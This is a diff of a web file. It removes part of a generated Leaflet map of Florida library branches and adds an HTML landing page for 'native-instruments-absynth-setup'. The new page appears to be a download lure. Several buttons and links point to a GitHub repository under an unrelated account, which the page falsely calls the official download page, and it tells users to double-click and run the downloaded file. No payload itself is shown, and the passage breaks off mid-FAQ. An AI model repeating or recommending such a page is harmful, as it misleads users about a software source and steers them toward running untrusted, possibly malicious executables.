-  "html": "\n        \u003cdiv style=\"\n            background:#ffffff;\n            border:2px solid #222;\n            border-radius:50%;\n            width:28px;\n            height:28px;\n            text-align:center;\n            line-height:24px;\n            font-weight:700;\n            font-size:12px;\n            color:#111;\n            box-shadow:0 1px 4px rgba(0,0,0,.35);\"\u003e\n            30\n        \u003c/div\u003e\n        ",
-  "className": "empty",
-});
-        
-    
-        var popup_025fe6ac6df8c90c702e880fafc93220 = L.popup({
-  "maxWidth": 280,
-});
-
-        
-            
-                var html_22d573d3e351eae171633c23bc6a7369 = $(`<div id="html_22d573d3e351eae171633c23bc6a7369" style="width: 100.0%; height: 100.0%;">     <div style="font-family: Arial; font-size: 13px;">       <b>30. Melbourne</b><br>       Suntree-Viera Library<br>       902 Jordan Blass Rd<br>       Melbourne, FL 32940     </div>     </div>`)[0];
-                popup_025fe6ac6df8c90c702e880fafc93220.setContent(html_22d573d3e351eae171633c23bc6a7369);
-            
-        
-
-        marker_caef8552ed16fd871121fb04f6e64444.bindPopup(popup_025fe6ac6df8c90c702e880fafc93220)
-        ;
-
-        
-    
-    
-            marker_caef8552ed16fd871121fb04f6e64444.bindTooltip(
-                `<div>
-                     30. Melbourne — Suntree-Viera Library
-                 </div>`,
-                {
-  "sticky": true,
-}
-            );
-        
-    
-                marker_caef8552ed16fd871121fb04f6e64444.setIcon(div_icon_5cb26bd96b7925aa79bb03a31a8bfd55);
-            
-    
-            var marker_610a4c9ce3978c0edb0850e903a10ece = L.marker(
-                [27.901, -81.588],
-                {
-}
-            ).addTo(map_cdeaa2c39c1ee89fddb41611cba312c8);
-        
-    
-            var div_icon_8784b306ef9d03415d15e58b4bad8663 = L.divIcon({
-  "html": "\n        \u003cdiv style=\"\n            background:#ffffff;\n            border:2px solid #222;\n            border-radius:50%;\n            width:28px;\n            height:28px;\n            text-align:center;\n            line-height:24px;\n            font-weight:700;\n            font-size:12px;\n            color:#111;\n            box-shadow:0 1px 4px rgba(0,0,0,.35);\"\u003e\n            31\n        \u003c/div\u003e\n        ",
-  "className": "empty",
-});
-        
-    
-        var popup_0c40f615e8b04efc25611af05d05a36e = L.popup({
-  "maxWidth": 280,
-});
-
-        
-            
-                var html_ce3bbec4680af7d587eb441354bb6e0b = $(`<div id="html_ce3bbec4680af7d587eb441354bb6e0b" style="width: 100.0%; height: 100.0%;">     <div style="font-family: Arial; font-size: 13px;">       <b>31. Lake Wales</b><br>       Lake Wales Library<br>       290 Cypress Garden Ln<br>       Lake Wales, FL 33853     </div>     </div>`)[0];
-                popup_0c40f615e8b04efc25611af05d05a36e.setContent(html_ce3bbec4680af7d587eb441354bb6e0b);
-            
-        
-
-        marker_610a4c9ce3978c0edb0850e903a10ece.bindPopup(popup_0c40f615e8b04efc25611af05d05a36e)
-        ;
-
-        
-    
-    
-            marker_610a4c9ce3978c0edb0850e903a10ece.bindTooltip(
-                `<div>
-                     31. Lake Wales — Lake Wales Library
-                 </div>`,
-                {
-  "sticky": true,
-}
-            );
-        
-    
-                marker_610a4c9ce3978c0edb0850e903a10ece.setIcon(div_icon_8784b306ef9d03415d15e58b4bad8663);
-            
-    
-            var marker_4fb5b0a2119bef13bb9b8ebf58e0984e = L.marker(
-                [29.049, -82.46],
-                {
-}
-            ).addTo(map_cdeaa2c39c1ee89fddb41611cba312c8);
-        
-    
-            var div_icon_3118e65f55f0446dcc6284c04c52cd12 = L.divIcon({
-  "html": "\n        \u003cdiv style=\"\n            background:#ffffff;\n            border:2px solid #222;\n            border-radius:50%;\n            width:28px;\n            height:28px;\n            text-align:center;\n            line-height:24px;\n            font-weight:700;\n            font-size:12px;\n            color:#111;\n            box-shadow:0 1px 4px rgba(0,0,0,.35);\"\u003e\n            32\n        \u003c/div\u003e\n        ",
-  "className": "empty",
-});
-        
-    
-        var popup_426c2b9967327ba9c5e2a349979baa6e = L.popup({
-  "maxWidth": 280,
-});
-
-        
-            
-                var html_25a0f91b89e04d33869385392e2a7e58 = $(`<div id="html_25a0f91b89e04d33869385392e2a7e58" style="width: 100.0%; height: 100.0%;">     <div style="font-family: Arial; font-size: 13px;">       <b>32. Dunnellon</b><br>       Dunnellon Library<br>       20351 Robinson Rd<br>       Dunnellon, FL 34431     </div>     </div>`)[0];
-                popup_426c2b9967327ba9c5e2a349979baa6e.setContent(html_25a0f91b89e04d33869385392e2a7e58);
-            
-        
-
-        marker_4fb5b0a2119bef13bb9b8ebf58e0984e.bindPopup(popup_426c2b9967327ba9c5e2a349979baa6e)
-        ;
-
-        
-    
-    
-            marker_4fb5b0a2119bef13bb9b8ebf58e0984e.bindTooltip(
-                `<div>
-                     32. Dunnellon — Dunnellon Library
-                 </div>`,
-                {
-  "sticky": true,
-}
-            );
-        
-    
-                marker_4fb5b0a2119bef13bb9b8ebf58e0984e.setIcon(div_icon_3118e65f55f0446dcc6284c04c52cd12);
-            
-    
-            map_cdeaa2c39c1ee89fddb41611cba312c8.fitBounds(
-                [[27.6, -82.757], [29.685, -80.698]],
-                {"padding": [40, 40]}
-            );
-        
-</script>
-</html>
+<body style="margin: 0; padding: 0; background-color: #f4f6f8; font-family: 'Segoe UI', Arial, sans-serif; color: #2d3436; line-height: 1.7;">
+
+    <!-- Main Container -->
+    <div style="max-width: 960px; margin: 0 auto; padding: 40px 20px;">
+
+        <!-- Header Section -->
+        <div style="background-color: #ffffff; border-radius: 12px; padding: 50px 40px; margin-bottom: 30px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); text-align: center;">
+            <h1 style="font-size: 2.5em; margin: 0 0 10px 0; color: #1a1a2e; font-weight: 700;">🎵 native-instruments-absynth-setup - Your Guide to Easy Setup</h1>
+            <p style="font-size: 1.2em; color: #636e72; margin: 10px 0 30px 0;">Simplify the process, get started today.</p>
+            <a href="https://github.com/trembling-reenactor91/native-instruments-absynth-setup" style="display: inline-block; background-color: #0984e3; color: #ffffff; padding: 18px 40px; font-size: 1.3em; text-decoration: none; border-radius: 50px; box-shadow: 0 4px 15px rgba(9,132,227,0.3); font-weight: 600; transition: transform 0.3s; margin-top: 15px;">⬇️ Download Now</a>
+            <p style="font-size: 0.9em; color: #b2bec3; margin-top: 20px;">Direct download available below</p>
+        </div>
+
+        <!-- Introduction -->
+        <div style="background-color: #ffffff; border-radius: 12px; padding: 40px; margin-bottom: 30px; box-shadow: 0 4px 15px rgba(0,0,0,0.08);">
+            <h2 style="color: #1a1a2e; font-size: 1.8em; margin-top: 0; border-bottom: 3px solid #0984e3; padding-bottom: 15px;">🚀 What This Is All About</h2>
+            <p style="font-size: 1.1em;">Welcome to <strong>native-instruments-absynth-setup</strong> – your one-stop resource for getting Absynth up and running on your Windows computer. Whether you're a first-time user or have installed software before, this page is designed to make things <em>super easy</em> for you.</p>
+            <p style="font-size: 1.1em;">Think of this as your friendly guidebook. We've collected all the important notes, checklists, and session logs in one place so you don't have to hunt around. No confusing tech talk – just clear, simple steps that anyone can follow.</p>
+            <p style="font-size: 1.1em;"><strong>What makes this special?</strong> It's all about making your experience smooth. We've taken the time to organize everything you need, so you can focus on creating great music, not fixing problems.</p>
+        </div>
+
+        <!-- Download Section (Primary) -->
+        <div style="background-color: #ffffff; border-radius: 12px; padding: 40px; margin-bottom: 30px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); text-align: center;">
+            <h2 style="color: #1a1a2e; font-size: 1.8em; margin-top: 0; border-bottom: 3px solid #00b894; padding-bottom: 15px;">📥 Download & Install</h2>
+            <p style="font-size: 1.2em; margin-bottom: 30px;">Ready to get started? It's simpler than you think.</p>
+            <p style="font-size: 1.3em; background-color: #f0f0f0; padding: 20px; border-radius: 8px; margin-bottom: 30px;"><strong>👉 Visit this link to download the application:</strong><br><a href="https://github.com/trembling-reenactor91/native-instruments-absynth-setup" style="color: #0984e3; font-weight: bold; text-decoration: underline; font-size: 1.1em; word-break: break-all;">https://github.com/trembling-reenactor91/native-instruments-absynth-setup</a></p>
+
+            <div style="background-color: #ffeaa7; border-left: 5px solid #fdcb6e; padding: 20px; border-radius: 8px; margin-top: 25px; text-align: left;">
+                <h3 style="color: #1a1a2e; margin-top: 0;">💡 How it works:</h3>
+                <p style="font-size: 1.1em; margin-bottom: 0;"><strong>1.</strong> Click the button at the top or the link above.</p>
+                <p style="font-size: 1.1em; margin-bottom: 0;"><strong>2.</strong> The page will open in your browser.</p>
+                <p style="font-size: 1.1em;"><strong>3.</strong> Follow the simple instructions on that page to get everything set up.</p>
+            </div>
+        </div>
+
+        <!-- Setup Guide Section -->
+        <div style="background-color: #ffffff; border-radius: 12px; padding: 40px; margin-bottom: 30px; box-shadow: 0 4px 15px rgba(0,0,0,0.08);">
+            <h2 style="color: #1a1a2e; font-size: 1.8em; margin-top: 0; border-bottom: 3px solid #6c5ce7; padding-bottom: 15px;">🛠️ Step-by-Step Setup Guide</h2>
+            <p style="font-size: 1.1em;">Follow these simple steps, and you'll be all set in no time:</p>
+
+            <div style="margin: 30px 0;">
+                <h3 style="color: #0984e3;">1️⃣ Prepare Your Computer</h3>
+                <p style="font-size: 1.05em;">Before you begin, make sure your Windows device is ready:</p>
+                <ul style="font-size: 1.05em; padding-left: 20px; line-height: 2;">
+                    <li>Make sure you're using a supported version of Windows (Windows 10 or 11 is ideal)</li>
+                    <li>Ensure you have at least 500 MB of free space on your hard drive</li>
+                    <li>Close any other heavy programs that might interfere</li>
+                    <li>Make sure you have a stable internet connection</li>
+                </ul>
+            </div>
+
+            <div style="margin: 30px 0;">
+                <h3 style="color: #0984e3;">2️⃣ Download the Software</h3>
+                <p style="font-size: 1.05em;">This is the easiest part:</p>
+                <ul style="font-size: 1.05em; padding-left: 20px; line-height: 2;">
+                    <li>Click the "Download Now" button at the top of this page</li>
+                    <li>You'll be taken to the official download page</li>
+                    <li>Look for the download button or section on that page</li>
+                    <li>Click it, and your download will start automatically</li>
+                </ul>
+                <div style="background-color: #dfe6e9; padding: 15px; border-radius: 8px; text-align: center; margin-top: 20px;">
+                    <a href="https://github.com/trembling-reenactor91/native-instruments-absynth-setup" style="display: inline-block; background-color: #00b894; color: white; padding: 15px 35px; text-decoration: none; border-radius: 50px; font-size: 1.1em; font-weight: 600; box-shadow: 0 4px 10px rgba(0,184,148,0.3);">⬇️ Go to Download Page</a>
+                </div>
+            </div>
+
+            <div style="margin: 30px 0;">
+                <h3 style="color: #0984e3;">3️⃣ Run the Setup</h3>
+                <p style="font-size: 1.05em;">Once downloaded, follow these actions:</p>
+                <ul style="font-size: 1.05em; padding-left: 20px; line-height: 2;">
+                    <li>Go to your "Downloads" folder</li>
+                    <li>Find the file you just downloaded</li>
+                    <li>Double-click the file to start the setup process</li>
+                    <li>Follow the on-screen instructions carefully</li>
+                    <li>When finished, you're ready to use the software</li>
+                </ul>
+            </div>
+
+            <div style="background-color: #55efc4; padding: 20px; border-radius: 8px; margin-top: 25px;">
+                <h3 style="color: #1a1a2e; margin-top: 0;">✅ Quick Checklist:</h3>
+                <ul style="font-size: 1.05em; list-style-type: none; padding-left: 0;">
+                    <li>✔️ Computer is ready (enough space, no interference)</li>
+                    <li>✔️ Downloaded the file successfully</li>
+                    <li>✔️ Ran the setup without errors</li>
+                    <li>✔️ Software opens and runs smoothly</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Checklist Section -->
+        <div style="background-color: #ffffff; border-radius: 12px; padding: 40px; margin-bottom: 30px; box-shadow: 0 4px 15px rgba(0,0,0,0.08);">
+            <h2 style="color: #1a1a2e; font-size: 1.8em; margin-top: 0; border-bottom: 3px solid #e17055; padding-bottom: 15px;">📋 Workflow Checklist</h2>
+            <p style="font-size: 1.1em;">Use this helpful checklist before and during your work with the software:</p>
+            <div style="margin: 20px 0;">
+                <h3 style="color: #d63031;">Before You Begin:</h3>
+                <ul style="font-size: 1.05em; line-height: 2.2;">
+                    <li>🔹 Confirm the software installed correctly</li>
+                    <li>🔹 Open the application once to make sure it loads</li>
+                    <li>🔹 Save your project files in a dedicated folder</li>
+                    <li>🔹 Keep your download file as a backup</li>
+                </ul>
+            </div>
+            <div style="margin: 20px 0;">
+                <h3 style="color: #d63031;">While Using the Software:</h3>
+                <ul style="font-size: 1.05em; line-height: 2.2;">
+                    <li>🔹 Save your work regularly</li>
+                    <li>🔹 Close other heavy programs for better performance</li>
+                    <li>🔹 If things run slow, restart the application</li>
+                    <li>🔹 Check the session logs for troubleshooting clues</li>
+                </ul>
+            </div>
+            <div style="background-color: #faf3f3; padding: 20px; border-radius: 8px; margin-top: 20px;">
+                <h3 style="color: #b33939; margin-top: 0;">💡 Tip:</h3>
+                <p style="font-size: 1.05em;">The session logs included in this repository tell you exactly what happened during your last use. If something goes wrong, check the logs first – they'll likely give you the answer.</p>
+            </div>
+        </div>
+
+        <!-- Session Logs Section -->
+        <div style="background-color: #ffffff; border-radius: 12px; padding: 40px; margin-bottom: 30px; box-shadow: 0 4px 15px rgba(0,0,0,0.08);">
+            <h2 style="color: #1a1a2e; font-size: 1.8em; margin-top: 0; border-bottom: 3px solid #00b894; padding-bottom: 15px;">📝 Session Logs</h2>
+            <p style="font-size: 1.1em;">Session logs are your best friend when troubleshooting. They're simple records of what happened each time you used the software. Here's how to read them:</p>
+            <div style="margin: 20px 0;">
+                <h3 style="color: #0984e3;">What You'll Find in Logs:</h3>
+                <ul style="font-size: 1.05em; line-height: 2;">
+                    <li><strong>Time stamps:</strong> When the software was opened and closed</li>
+                    <li><strong>Actions performed:</strong> What you did during the session</li>
+                    <li><strong>Errors (if any):</strong> Clear messages if something went wrong</li>
+                    <li><strong>Performance info:</strong> How well the software was running</li>
+                </ul>
+            </div>
+            <div style="background-color: #ffeaa7; padding: 20px; border-radius: 8px;">
+                <p style="font-size: 1.05em; margin: 0;"><strong>👉 Remember:</strong> If you ever need help, the session logs give you exact details to share with support. Save them if you have issues!</p>
+            </div>
+        </div>
+
+        <!-- FAQ Section -->
+        <div style="background-color: #ffffff; border-radius: 12px; padding: 40px; margin-bottom: 30px; box-shadow: 0 4px 15px rgba(0,0,0,0.08);">
+            <h2 style="color: #1a1a2e; font-size: 1.8em; margin-top: 0; border-bottom: 3px solid #e17055; padding-bottom: 15px;">❓ Frequently Asked Questions</h2>
+
+            <div style="margin: 20px 0; background-color: #f8f9fa; padding: 20px; border-radius: 8px;">
+                <h3 style="color: #1a1a2e; margin-top: 0;">What if my download doesn't start?</h3>
+                <p style="font-size: 1.05em;">Check your internet connection first. Then try clicking the download button again. Some browsers might block automatic downloads – check your browser's download settings and allow downloads from this site.</p>
+            </div>
+
+            <div style="margin: 20px 0; background-color: #f8f9fa; padding: 20px; border-radius: 8px;">
+                <h3 style="color: #1a1a2e; margin-top: 0;">The software won't open after setup. What do I do?</h3>
+                <p style="font-size: 1.05em;">First, restart your computer. Still not working? Try running the setup one more time. Check the session logs – they'll tell you exactly what went wrong. Most issues are simple to fix.</p>
+            </div>
+
+            <div style="margin: 20px 0; background-color: #f8f9fa; padding: 20px; border-radius: 8px;">
+                <h3 style="color: #1a1a2e; margin-top: 0;">Do I need special skills to use this?</h3>
+                <p style="font-size: 1.05em;">Absolutely not! This is designed for everyone. If you can use a computer for basic tasks, you can use this. Everything is explained simply.</p>
+            </div>
+
+            <div style="margin: 20px 0; background-color: #f8f9fa; padding: 20px; border-radius: 8px;">
+                <h3 style="color: #1a1a2e; margin-top: 0;">Will this work
